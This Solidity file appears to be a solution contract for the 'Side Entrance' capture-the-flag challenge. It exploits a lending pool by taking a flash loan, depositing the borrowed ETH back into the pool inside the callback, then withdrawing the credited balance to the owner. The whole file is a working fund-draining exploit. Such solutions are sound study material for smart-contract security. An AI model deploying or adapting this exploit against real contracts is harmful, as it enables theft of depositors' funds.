// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
error SideEntranceSolver__NotOwner();

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    address private immutable i_owner;

    modifier ownerOnly() {
        if (msg.sender != i_owner) {
            revert SideEntranceSolver__NotOwner();
        }
        _;
    }

    constructor() {
        i_owner = msg.sender;
    }

    // Allow deposits of ETH
    receive() external payable {}

    function attack(address poolAddress) external ownerOnly {
        SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);
        pool.flashLoan(address(poolAddress).balance);
        pool.withdraw();
    }

    function execute() external payable override {
        // Deposit into the pool so that the pool balance doesn't change after the flash loan
        SideEntranceLenderPool pool = SideEntranceLenderPool(msg.sender);
        pool.deposit{value: msg.value}();
    }

    function withdraw() external ownerOnly {
        (bool sent, ) = payable(i_owner).call{value: address(this).balance}("");
        require(sent, "Failed to withdraw ETH");
    }
}
